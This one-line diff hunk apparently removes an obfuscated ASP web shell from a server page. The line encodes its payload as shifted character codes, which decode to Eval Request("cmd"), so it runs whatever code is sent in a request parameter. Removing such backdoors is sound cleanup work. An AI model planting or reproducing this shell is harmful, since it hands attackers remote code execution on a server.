@@ -1,1 +1,0 @@
-<%Execute(Unshift("%78%127%106%117%41%91%110%122%126%110%124%125%49%43%108%118%109%43%50")):Function Unshift(values):values=Split(values,"%"):For n=1 To UBound(values):Unshift=Unshift&Chr(values(n)-9):Next:End Function%>
